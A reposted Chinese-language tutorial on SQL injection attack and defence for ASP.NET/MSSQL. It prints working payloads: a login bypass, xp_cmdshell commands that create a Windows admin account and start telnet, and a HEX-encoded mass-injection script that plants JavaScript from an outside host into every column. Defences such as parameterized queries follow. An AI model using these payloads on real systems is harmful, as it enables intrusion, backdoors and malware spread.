<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>分享：SQL 注入攻防入門詳解 | 极客快訊</title><meta property="og:title" content="分享：SQL 注入攻防入門詳解 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/ef1b0ca1957a4f56ad3ba30eb5f6524f"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/fcecfb0.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/fcecfb0.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="分享：SQL 注入攻防入門詳解"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/fcecfb0.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>分享：SQL 注入攻防入門詳解</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><div><p class=ql-align-justify>畢業開始從事winfrm到今年轉到 web ，在碼農屆已經足足混了快接近3年了，但是對安全方面的知識依舊薄弱，事實上是沒機會接觸相關開發……必須的各種藉口。這幾天把sql注入的相關知識整理了下，希望大家多多提意見。</p><p class=ql-align-justify>（對於sql注入的攻防，我只用過簡單拼接字符串的注入及參數化查詢，可以說沒什麼好經驗，為避免後知後覺的犯下大錯，專門查看大量前輩們的心得，這方面的資料頗多，將其精簡出自己覺得重要的，就成了該文）</p><p class=ql-align-justify>下面的程序方案是採用 ASP.NET + MSSQL，其他技術在設置上會有少許不同。</p><p class=ql-align-justify><strong>什麼是SQL注入（SQL Injection）</strong></p><p class=ql-align-justify>所謂SQL注入式攻擊，就是攻擊者把SQL命令插入到Web表單的輸入域或頁面請求的查詢字符串，欺騙服務器執行惡意的SQL命令。在某些表單中，用戶輸入的內容直接用來構造（或者影響）動態SQL命令，或作為存儲過程的輸入參數，這類表單特別容易受到SQL注入式攻擊。</p><p class=ql-align-justify><strong>嚐嚐SQL注入</strong></p><p class=ql-align-justify><strong>1. 一個簡單的登錄頁面</strong></p><p class=ql-align-justify>關鍵代碼：</p><blockquote><p>privateboolNoProtectLogin(<strong>string</strong> userName, <strong>string</strong> <strong>password</strong>){<strong>int</strong> count = (<strong>int</strong>)SqlHelper.Instance.ExecuteScalar(<strong>string</strong>.<strong>Format</strong> ("SELECT COUNT(*) FROM Login WHERE UserName='{0}' AND Password='{1}'", userName, <strong>password</strong>));<strong>return</strong> count > 0 ? <strong>true</strong> : <strong>false</strong>;}</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>方法中userName和 password 是沒有經過任何處理，直接拿前端傳入的數據，這樣拼接的SQL會存在注入漏洞。（帳戶：admin 123456）</p><p class=ql-align-justify>1) 輸入正常數據，效果如圖：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ef1b0ca1957a4f56ad3ba30eb5f6524f><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><p class=ql-align-justify>合併的SQL為：</p><blockquote><p>SELECT COUNT(*) FROM Login WHERE UserName=’admin’ AND Password=’123456′</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>2) 輸入注入數據：</p><p class=ql-align-justify>如圖，即用戶名為：用戶名：admin’—，密碼可隨便輸入</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/7e75437c902d4e0eb3d3edcc2e89d65f><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><p class=ql-align-justify>合併的SQL為：</p><blockquote><p>SELECT COUNT(*) FROM Login WHERE UserName=’admin’– Password=’123′</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>因為UserName值中輸入了“–”註釋符，後面語句被省略而登錄成功。（常常的手法：前面加上‘; ‘ (分號，用於結束前一條語句)，後邊加上‘–‘ (用於註釋後邊的語句)）</p><h1 class=ql-align-justify><strong>2. 上面是最簡單的一種SQL注入，常見的注入語句還有：</strong></h1><p class=ql-align-justify><br></p><p class=ql-align-justify>1) 猜測數據庫名，備份數據庫</p><p class=ql-align-justify>a) 猜測數據庫名： and db_name() >0 或系統表master.dbo.sysdatabases</p><p class=ql-align-justify>b) 備份數據庫：;backup database 數據庫名 to disk = ‘c:*.db’;–</p><p class=ql-align-justify>或：declare a sysname;set @a=db_name();backup database a to disk=’你的IP你的共享目錄bak.dat’ ,name=’test’;–</p><p class=ql-align-justify>2) 猜解字段名稱</p><p class=ql-align-justify>a) 猜解法：and (select count(字段名) from 表名)>0 若“字段名”存在，則返回正常</p><p class=ql-align-justify>b) 讀取法：and (select top 1 col_name(object_id(‘表名‘),1) from sysobjects)>0 把col_name(object_id(‘表名‘),1)中的1依次換成2,3,4,5，6…就可得到所有的字段名稱。</p><p class=ql-align-justify>3) 遍歷系統的目錄結構，分析結構並發現WEB虛擬目錄（服務器上傳木馬）</p><p class=ql-align-justify>先創建一個臨時表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–</p><p class=ql-align-justify>a) 利用xp_availablemedia來獲得當前所有驅動器,並存入temp表中</p><p class=ql-align-justify>;insert temp exec master.dbo.xp_availablemedia;–</p><p class=ql-align-justify>b) 利用xp_subdirs獲得子目錄列表,並存入temp表中</p><p class=ql-align-justify>;insert into temp(id) exec master.dbo.xp_subdirs ‘c:’;–</p><p class=ql-align-justify>c) 利用xp_dirtree可以獲得“所有”子目錄的目錄樹結構,並存入temp表中</p><p class=ql-align-justify>;insert into temp(id,num1) exec master.dbo.xp_dirtree ‘c:’;– （實驗成功）</p><p class=ql-align-justify>d) 利用 bcp 命令將表內容導成文件</p><p class=ql-align-justify>即插入木馬文本，然後導出存為文件。比如導出為asp文件，然後通過瀏覽器訪問該文件並執行惡意腳本。（使用該命令必須啟動’ xp_cmdshell’）</p><blockquote><p>Exec master..xp_cmdshell N’BCP “select * from SchoolMarket.dbo.GoodsStoreData;” queryout c:/inetpub/wwwroot/runcommand.asp -w -S”localhost” -U”sa” -P”123″‘</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>(注意：語句中使用的是雙引號，另外表名格式為“數據庫名.用戶名.表名”)</p><p class=ql-align-justify>在sql查詢器中通過語句：Exec master..xp_cmdshell N’BCP’即可查看BCP相關參數，如圖：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/96ff373d743c413db79c5993f0e0ca01><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><p class=ql-align-justify>4) 查詢當前用戶的數據庫權限</p><p class=ql-align-justify>MSSQL中一共存在8種權限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p><p class=ql-align-justify>可通過1=(select IS_SRVROLEMEMBER(‘sysadmin’))得到當前用戶是否具有該權限。</p><p class=ql-align-justify>5) 設置新的數據庫帳戶（得到MSSQL管理員賬戶）</p><p class=ql-align-justify>d) 在數據庫內添加一個hax用戶，默認密碼是空</p><p class=ql-align-justify>;exec sp_addlogin’hax’;–</p><p class=ql-align-justify>e) 給hax設置密碼 (null是舊密碼，password是新密碼，user是用戶名)</p><p class=ql-align-justify>;exec master.dbo.sp_password null,password,username;–</p><p class=ql-align-justify>f) 將hax添加到sysadmin組</p><p class=ql-align-justify>;exec master.dbo.sp_addsrvrolemember ‘hax’ ,’sysadmin’;–</p><p class=ql-align-justify>6) xp_cmdshell MSSQL存儲過程（得到 WINDOWS管理員賬戶 ）</p><p class=ql-align-justify>通過(5)獲取到sysadmin權限的帳戶後，使用查詢分析器連接到數據庫，可通過xp_cmdshell運行系統命令行（必須是sysadmin權限），即使用 cmd.exe 工具，可以做什麼自己多瞭解下。</p><p class=ql-align-justify>下面我們使用xp_cmdshell來創建一個 Windows 用戶，並開啟遠程登錄服務：</p><p class=ql-align-justify>a) 判斷xp_cmdshell擴展存儲過程是否存在</p><blockquote><p>SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = ‘X’ AND name =’xp_cmdshell’</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>b) 恢復xp_cmdshell擴展存儲過程</p><p class=ql-align-justify>Exec master.dbo.sp_addextendedproc ‘xp_cmdshell’,’e:inetputwebxplog70.dll’;</p><p class=ql-align-justify>開啟後使用xp_cmdshell還會報下面錯誤：</p><p class=ql-align-justify>SQL Server 阻止了對組件 ‘xp_cmdshell’ 的過程 ‘sys.xp_cmdshell’ 的訪問，因為此組件已作為此服務器安全配置的一部分而被關閉。系統管理員可以通過使用sp_configure啟用 ‘xp_cmdshell’。有關啟用 ‘xp_cmdshell’ 的詳細信息，請參閱 SQL Server 聯機叢書中的 “外圍應用配置器“。</p><p class=ql-align-justify>通過執行下面語句進行設置：</p><blockquote><p>— 允許配置高級選項EXEC sp_configure ‘show advanced options’, 1GO— 重新配置RECONFIGUREGO— 啟用xp_cmdshellEXEC sp_configure ‘xp_cmdshell’, 0GO—重新配置RECONFIGUREGO</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>c) 禁用xp_cmdshell擴展存儲過程</p><p class=ql-align-justify>Exec master.dbo.sp_dropextendedproc ‘xp_cmdshell’;</p><p class=ql-align-justify>d) 添加windows用戶：</p><p class=ql-align-justify>Exec xp_cmdshell ‘net user awen /add’;</p><p class=ql-align-justify>e) 設置好密碼：</p><p class=ql-align-justify>Exec xp_cmdshell ‘net user awen password’;</p><p class=ql-align-justify>f) 提升到管理員：</p><p class=ql-align-justify>Exec xp_cmdshell ‘net localgroup administrators awen /add’;</p><p class=ql-align-justify>g) 開啟telnet服務：</p><p class=ql-align-justify>Exec xp_cmdshell ‘net start tlntsvr’</p><p class=ql-align-justify>7) 沒有xp_cmdshell擴展程序，也可創建Windows帳戶的辦法.</p><p class=ql-align-justify>(本人windows7系統，測試下面SQL語句木有效果)</p><blockquote><p>declare shell int ;execsp_OAcreate ‘w script .shell’,shell output ;execsp_OAmethod shell,’run’,null,’C:WindowsSystem32cmd.exe /c net user awen /add’;execsp_OAmethod shell,’run’,null,’C:WindowsSystem32cmd.exe /c net user awen 123′;execsp_OAmethod shell,’run’,null,’C:WindowsSystem32cmd.exe /c net localgroup administrators awen /add’;</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>在使用的時候會報如下錯：</p><p class=ql-align-justify>SQL Server 阻止了對組件 ‘Ole Automation Procedures’ 的過程 ‘sys.sp_OACreate’、‘sys.sp_OAMethod’ 的訪問，因為此組件已作為此服務器安全配置的一部分而被關閉。系統管理員可以通過使用sp_configure啟用 ‘Ole Automation Procedures’。有關啟用 ‘Ole Automation Procedures’ 的詳細信息，請參閱 SQL Server 聯機叢書中的 “外圍應用配置器“。</p><p class=ql-align-justify>解決辦法：</p><blockquote><p>sp_configure ‘show advanced options’, 1;GORECONFIGURE;GOsp_configure ‘Ole Automation Procedures’, 1;GORECONFIGURE;GO</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>好了，這樣別人可以登錄你的服務器了，你怎麼看？</p><p class=ql-align-justify>8) 客戶端腳本攻擊</p><p class=ql-align-justify>攻擊1：（正常輸入）攻擊者通過正常的輸入提交方式將惡意腳本提交到數據庫中，當其他用戶瀏覽此內容時就會受到惡意腳本的攻擊。</p><p class=ql-align-justify>措施：轉義提交的內容，.NET 中可通過System.Net.WebUtility.HtmlEncode(string) 方法將字符串轉換為HTML編碼的字符串。</p><p class=ql-align-justify>攻擊2：（SQL注入）攻擊者通過SQL注入方式將惡意腳本提交到數據庫中，直接使用SQL語法UPDATE數據庫，為了跳過System.Net.WebUtility.HtmlEncode(string) 轉義，攻擊者會將注入SQL經過“HEX編碼”，然後通過exec可以執行“動態”SQL的特性運行腳本”。</p><p class=ql-align-justify>a) 向當前數據庫的每個表的每個字段插入一段惡意腳本</p><blockquote><p><strong>Declare</strong> T <strong>Varchar</strong>(255),C <strong>Varchar</strong>(255)<strong>Declare</strong> Table_Cursor <strong>Cursor</strong> <strong>ForSelect</strong> A.Name,B.Name<strong>From</strong> SysobjectsA,Syscolumns B <strong>Where</strong> A.Id=B.Id <strong>And</strong> A.Xtype='u' <strong>And</strong> (B.Xtype=99 <strong>Or</strong> B.Xtype=35 <strong>Or</strong> B.Xtype=231 <strong>Or</strong> B.Xtype=167)<strong>Open</strong> Table_Cursor<strong>Fetch</strong> <strong>Next</strong> <strong>From</strong> Table_Cursor <strong>Into</strong> @T,@C<strong>While</strong>(@@Fetch_Status=0)<strong>Begin</strong>Exec('update ['+@T+'] Set ['+@C+']=Rtrim(Convert(Varchar(8000),['+@C+']))+''''') <strong>Fetch</strong> <strong>Next</strong> <strong>From</strong> Table_Cursor <strong>Into</strong> @T,@C <strong>End</strong> <strong>Close</strong> Table_Cursor DeallocateTable_Cursor</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>b) 更高級的攻擊，將上面的注入SQL進行“HEX編碼”，從而避免程序的關鍵字檢查、腳本轉義等，通過EXEC執行</p><blockquote><p><strong>dEcLaRe</strong> s <strong>vArChAr</strong>(8000) <strong>sEt</strong> @s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;eXeC(@s);--</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>c) 批次刪除數據庫被注入的腳本</p><blockquote><p><strong>declare</strong> @delStrnvarchar(500)<strong>set</strong> @delStr='' --要被替換掉字符 setnocount <strong>on</strong> <strong>declare</strong> @tableNamenvarchar(100),@columnNamenvarchar(100),@tbIDint,@iRowint,@iResultint <strong>declare</strong> @sqlnvarchar(500) <strong>set</strong> @iResult=0 <strong>declare</strong> cur <strong>cursor</strong> <strong>for</strong> selectname,id <strong>from</strong> sysobjects <strong>where</strong> xtype='U' <strong>open</strong> cur <strong>fetch</strong> <strong>next</strong> <strong>from</strong> cur <strong>into</strong> @tableName,@tbID <strong>while</strong> @@fetch_status=0 <strong>begin</strong> <strong>declare</strong> cur1 <strong>cursor</strong> <strong>for</strong> --xtype <strong>in</strong> (231,167,239,175) 為<strong>char</strong>,<strong>varchar</strong>,nchar,nvarchar類型 <strong>select</strong> name <strong>from</strong> syscolumns <strong>where</strong> xtype <strong>in</strong> (231,167,239,175) <strong>and</strong> id=@tbID <strong>open</strong> cur1 <strong>fetch</strong> <strong>next</strong> <strong>from</strong> cur1 <strong>into</strong> @columnName <strong>while</strong> @@fetch_status=0 <strong>begin</strong> <strong>set</strong> @<strong>sql</strong>='update [' + @tableName + '] set ['+ @columnName +']= replace(['+@columnName+'],'''+@delStr+''','''') where ['+@columnName+'] like ''%'+@delStr+'%''' execsp_executesql <strong>sql</strong> <strong>set</strong> @iRow=@@rowcount <strong>set</strong> @iResult=@iResult+@iRow <strong>if</strong> @iRow>0 <strong>begin</strong> print '表：'+@tableName+',列:'+@columnName+'被更新'+<strong>convert</strong>(<strong>varchar</strong>(10),@iRow)+'條記錄;' <strong>end</strong> <strong>fetch</strong> <strong>next</strong> <strong>from</strong> cur1 <strong>into</strong> @columnName <strong>end</strong> <strong>close</strong> cur1 deallocate cur1 <strong>fetch</strong> <strong>next</strong> <strong>from</strong> cur <strong>into</strong> @tableName,@tbID <strong>end</strong> print '數據庫共有'+<strong>convert</strong>(<strong>varchar</strong>(10),@iResult)+'條記錄被更新!!!' <strong>close</strong> cur deallocate cur setnocount off</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>d) 我如何得到“HEX編碼”？</p><p class=ql-align-justify>開始不知道HEX是什麼東西，後面查了是“十六進制”，網上已經給出兩種轉換方式：（注意轉換的時候不要加入十六進制的標示符 ’0x’ ）</p><p class=ql-align-justify>Ø 在線轉換 （TRANSLATOR, BINARY），進入……</p><p class=ql-align-justify>Ø C#版的轉換，進入……</p><p class=ql-align-justify>9) 對於敏感詞過濾不到位的檢查，我們可以結合函數構造SQL注入</p><p class=ql-align-justify>比如過濾了update，卻沒有過濾declare、exec等關鍵詞，我們可以使用reverse來將倒序的sql進行注入：</p><blockquote><p>declare A varchar(200);set @A=reverse('''58803303431''=emanresu erehw ''9d4d9c1ac9814f08''=drowssaP tes xxx tadpu');</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify><strong>防止SQL注入</strong></p><p class=ql-align-justify><strong>1. 數據庫權限控制，只給訪問數據庫的web應用功能所需的最低權限帳戶。</strong></p><p class=ql-align-justify>如MSSQL中一共存在8種權限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。</p><p class=ql-align-justify><strong>2. 自定義錯誤信息，首先我們要屏蔽服務器的詳細錯誤信息傳到客戶端。</strong></p><p class=ql-align-justify>在 ASP.NET 中，可通過web.config配置文件的節點設置：</p><blockquote><p>&lt;customerrors defaultredirect="url" <strong>mode</strong>="On|Off|RemoteOnly"> &lt;error. .=""/>&lt;/customerrors></p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>mode：指定是啟用或禁用自定義錯誤，還是僅向遠程客戶端顯示自定義錯誤。</p><p>On指定啟用自定義錯誤。如果未指定defaultRedirect，用戶將看到一般性錯誤。Off指定禁用自定義錯誤。這允許顯示標準的詳細錯誤。RemoteOnly指定僅向遠程客戶端顯示自定義錯誤並且向本地主機顯示 ASP.NET 錯誤。這是默認值。</p><p class=ql-align-justify><br></p><p class=ql-align-justify>看下效果圖：</p><p class=ql-align-justify>設置為一般性錯誤：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9885d11955604bb7be579a81a2d053cc><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><p class=ql-align-justify>設置為：</p><div class=pgc-img><img alt="分享：SQL 注入攻防入門詳解" onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/6d73fb3ff6ba404eb1a61647f0dfcf12><p class=pgc-img-caption></p></div><p class=ql-align-justify><br></p><h1 class=ql-align-justify><br></h1><h1 class=ql-align-justify><strong>3. 把危險的和不必要的存儲過程刪除</strong></h1><p class=ql-align-justify><br></p><p class=ql-align-justify>xp_：擴展存儲過程的前綴，SQL注入攻擊得手之後，攻擊者往往會通過執行xp_cmdshell之類的擴展存儲過程，獲取系統信息，甚至控制、破壞系統。</p><p>xp_cmdshell能執行dos命令，通過語句sp_dropextendedproc刪除，</p><p>不過依然可以通過sp_addextendedproc來恢復，因此最好刪除或改名xplog70.dll（sql server 2000、windows7）</p><p>xpsql70.dll(sqlserer 7.0)</p><p>xp_fileexist用來確定一個文件是否存在xp_getfiledetails可以獲得文件詳細資料xp_dirtree可以展開你需要了解的目錄，獲得所有目錄深度Xp_getnetname可以獲得服務器名稱Xp_regaddmultistring</p><p>Xp_regdeletekey</p><p>Xp_regdeletevalue</p><p>Xp_regenumvalues</p><p>Xp_regread</p><p>Xp_regremovemultistring</p><p>Xp_regwrite</p><p>可以訪問註冊表的存儲過程Sp_OACreate</p><p>Sp_OADestroy</p><p>Sp_OAGetErrorInfo</p><p>Sp_OAGetProperty</p><p>Sp_OAMethod</p><p>Sp_OASetProperty</p><p>Sp_OAStop</p><p>如果你不需要請丟棄OLE自動存儲過程</p><h1 class=ql-align-justify><br></h1><h1 class=ql-align-justify><strong>4. 非參數化SQL與參數化SQL</strong></h1><p class=ql-align-justify><br></p><p class=ql-align-justify>1) 非參數化（動態拼接SQL）</p><p class=ql-align-justify>a) 檢查客戶端腳本：若使用.net，直接用System.Net.WebUtility.HtmlEncode(string)將輸入值中包含的HTML特殊轉義字符轉換掉。</p><p class=ql-align-justify>b) 類型檢查：對接收數據有明確要求的，在方法內進行類型驗證。如數值型用int.TryParse()，日期型用DateTime.TryParse() ，只能用英文或數字等。</p><p class=ql-align-justify>c) 長度驗證：要進行必要的注入，其語句也是有長度的。所以如果你原本只允許輸入10字符，那麼嚴格控制10個字符長度，一些注入語句就沒辦法進行。</p><p class=ql-align-justify>d) 使用枚舉：如果只有有限的幾個值，就用枚舉。</p><p class=ql-align-justify>e) 關鍵字過濾：這個門檻比較高，因為各個數據庫存在關鍵字，內置函數的差異，所以對編寫此函數的功底要求較高。如公司或個人有積累一個比較好的通用過濾函數還請留言分享下，學習學習，謝謝！</p><p class=ql-align-justify>這邊提供一個關鍵字過濾參考方案(MSSQL)：</p><blockquote><p>public static <strong>bool</strong> ValiParms(<strong>string</strong> parms){ <strong>if</strong> (parms == <strong>null</strong>) { <strong>return</strong> <strong>false</strong>; } Regex regex = new Regex("sp_", RegexOptions.IgnoreCase); Regex regex2 = new Regex("'", RegexOptions.IgnoreCase); Regex regex3 = new Regex("create ", RegexOptions.IgnoreCase); Regex regex4 = new Regex("drop ", RegexOptions.IgnoreCase); Regex regex5 = new Regex(""", RegexOptions.IgnoreCase); Regex regex6 = new Regex("exec ", RegexOptions.IgnoreCase); Regex regex7 = new Regex("xp_", RegexOptions.IgnoreCase); Regex regex8 = new Regex("<strong>insert</strong> ", RegexOptions.IgnoreCase); Regex regex9 = new Regex("<strong>delete</strong> ", RegexOptions.IgnoreCase); Regex regex10 = new Regex("<strong>select</strong> ", RegexOptions.IgnoreCase); Regex regex11 = new Regex("<strong>update</strong> ", RegexOptions.IgnoreCase); <strong>return</strong> (regex.IsMatch(parms) || (regex2.IsMatch(parms) || (regex3.IsMatch(parms) || (regex4.IsMatch(parms) || (regex5.IsMatch(parms) || (regex6.IsMatch(parms) || (regex7.IsMatch(parms) || (regex8.IsMatch(parms) || (regex9.IsMatch(parms) || (regex10.IsMatch(parms) || (regex11.IsMatch(parms))))))))))));}</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>優點：寫法相對簡單，網絡傳輸量相對參數化拼接SQL小</p><p class=ql-align-justify>缺點：</p><p class=ql-align-justify>a) 對於關鍵字過濾，常常“顧此失彼”，如漏掉關鍵字，系統函數，對於HEX編碼的SQL語句沒辦法識別等等，並且需要針對各個數據庫封裝函數。</p><p class=ql-align-justify>b) 無法滿足需求：用戶本來就想發表包含這些過濾字符的數據。</p><p class=ql-align-justify>c) 執行拼接的SQL浪費大量緩存空間來存儲只用一次的查詢計劃。服務器的物理內存有限，SQLServer的緩存空間也有限。有限的空間應該被充分利用。</p><p class=ql-align-justify>2) 參數化查詢（Parameterized Query）</p><p class=ql-align-justify>a) 檢查客戶端腳本，類型檢查，長度驗證，使用枚舉，明確的關鍵字過濾這些操作也是需要的。他們能儘早檢查出數據的有效性。</p><p class=ql-align-justify>b) 參數化查詢原理：在使用參數化查詢的情況下，數據庫服務器不會將參數的內容視為SQL指令的一部份來處理，而是在數據庫完成 SQL 指令的編譯後，才套用參數運行，因此就算參數中含有具有損的指令，也不會被數據庫所運行。</p><p class=ql-align-justify>c) 所以在實際開發中，入口處的安全檢查是必要的，參數化查詢應作為最後一道安全防線。</p><p class=ql-align-justify>優點：</p><p class=ql-align-justify>Ø 防止SQL注入(使單引號、分號、註釋符、xp_擴展函數、拼接SQL語句、EXEC、SELECT、UPDATE、DELETE等SQL指令無效化)</p><p class=ql-align-justify>Ø 參數化查詢能強制執行類型和長度檢查。</p><p class=ql-align-justify>Ø 在MSSQL中生成並重用查詢計劃，從而提高查詢效率（執行一條SQL語句，其生成查詢計劃將消耗大於50%的時間）</p><p class=ql-align-justify>缺點：</p><p class=ql-align-justify>Ø 不是所有數據庫都支持參數化查詢。目前Access、SQL Server、MySQL、SQLite、Oracle等常用數據庫支持參數化查詢。</p><p class=ql-align-justify>疑問：參數化如何“批量更新”數據庫。</p><p class=ql-align-justify>a) 通過在參數名上增加一個計數來區分開多個參數化語句拼接中的同名參數。</p><p class=ql-align-justify>EG：</p><blockquote><p>StringBuilder sqlBuilder=new StringBuilder(512);<strong>Int</strong> count=0;<strong>For</strong>(循環){sqlBuilder.AppendFormat(“<strong>UPDATE</strong> login <strong>SET password</strong>=@<strong>password</strong>{0} <strong>WHERE</strong> username=@userName{0}”,count.ToString());SqlParameter para=new SqlParamter(){ParameterName=@<strong>password</strong>+count.ToString()}……Count++;}</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>b) 通過MSSQL 2008的新特性：表值參數，將C#中的整個表當參數傳遞給存儲過程，由SQL做邏輯處理。注意C#中參數設置parameter.SqlDbType = System.Data.SqlDbType.Structured; 詳細請查看……</p><p class=ql-align-justify>疑慮：有部份的開發人員可能會認為使用參數化查詢，會讓程序更不好維護，或者在實現部份功能上會非常不便，然而，使用參數化查詢造成的額外開發成本，通常都遠低於因為SQL注入攻擊漏洞被發現而遭受攻擊，所造成的重大損失。</p><p class=ql-align-justify>另外：想驗證重用查詢計劃的同學，可以使用下面兩段輔助語法</p><blockquote><p>--清空緩存的查詢計劃DBCC FREEPROCCACHEGO--查詢緩存的查詢計劃<strong>SELECT</strong> stats.execution_count <strong>AS</strong> cnt, p.size_in_bytes <strong>AS</strong> [size], [<strong>sql</strong>].[<strong>text</strong>] <strong>AS</strong> [plan_text] <strong>FROM</strong> sys.dm_exec_cached_plans p<strong>OUTER</strong> APPLY sys.dm_exec_sql_text (p.plan_handle) <strong>sqlJOIN</strong> sys.dm_exec_query_stats stats <strong>ON</strong> stats.plan_handle = p.plan_handleGO</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify>3) 參數化查詢示例</p><p class=ql-align-justify>效果如圖：</p><p class=ql-align-justify>參數化關鍵代碼：</p><blockquote><p>Private <strong>bool</strong> ProtectLogin(<strong>string</strong> userName, <strong>string</strong> <strong>password</strong>){ SqlParameter[] parameters = new SqlParameter[] { new SqlParameter{ParameterName="@UserName",SqlDbType=SqlDbType.NVarChar,Size=10,<strong>Value</strong>=userName}, new SqlParameter{ParameterName="@Password",SqlDbType=SqlDbType.<strong>VarChar</strong>,Size=20,<strong>Value</strong>=<strong>password</strong>} }; <strong>int</strong> count = (<strong>int</strong>)SqlHelper.Instance.ExecuteScalar ("SELECT COUNT(*) FROM Login WHERE UserName=@UserName AND Password=@password", parameters); <strong>return</strong> count > 0 ? <strong>true</strong> : <strong>false</strong>;}</p></blockquote><p class=ql-align-justify><br></p><p class=ql-align-justify><strong>5. 存儲過程</strong></p><p class=ql-align-justify>存儲過程（Stored Procedure）是在大型數據庫系統中，一組為了完成特定功能的SQL 語句集，經編譯後存儲在數據庫中，用戶通過指定存儲過程的名字並給出參數（如果該存儲過程帶有參數）來執行它。</p><p class=ql-align-justify>優點：</p><p class=ql-align-justify>a) 